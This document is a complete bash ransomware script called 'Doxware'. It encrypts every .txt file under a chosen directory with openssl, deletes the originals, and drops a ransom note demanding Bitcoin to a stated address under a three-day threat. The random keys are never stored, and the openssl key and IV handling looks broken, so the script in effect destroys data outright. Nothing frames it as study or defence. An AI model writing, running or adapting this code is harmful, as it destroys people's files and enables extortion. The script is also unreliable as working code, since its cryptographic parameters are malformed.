#!/bin/bash

# Directory to start encryption from (use current directory as default)
TARGET_DIR="${1:-$(pwd)}"

# Ransom note content
RANSOM_NOTE=$(cat <<EOF
YOUR FILES HAVE BEEN ENCRYPTED BY DOXWARE!
THEY WILL BE DELETED IF YOU DON'T PAY THE RANSOM.

TO DECRYPT YOUR FILES, FOLLOW THESE INSTRUCTIONS:

1. Pay the ransom using Bitcoin to 3KpJ7GtBQ5PjQZs7yHhM6b98f4G29jDw6e.
2. Use the following decryption key: DoxwearIsHere!

After paying, contact us at admin@doxware.com for further instructions.

YOU HAVE 3 DAYS TO PAY THE RANSOM OR YOUR FILES WILL BE PERMANENTLY DELETED!
EOF
)

# Encrypt files with .txt extension
for file in $(find "$TARGET_DIR" -type f -name "*.txt"); do
    if [ -f "$file" ]; then
        echo "Encrypting $file..."
        
        # Generate a random AES key for encryption
        KEY=$(openssl rand -base64 32)
        
        # Encrypt the file
        openssl enc -aes-256-cbc -in "$file" -out "${file}.dox" -K "$KEY" -iv "0000000000000000"
        
        # Remove original file
        rm "$file"

        echo "Encrypted: $file -> ${file}.dox"
    fi
done

# Create the ransom note file in the target directory
echo "$RANSOM_NOTE" > "$TARGET_DIR/ransom.txt"

echo "Doxware ransomware operation completed."
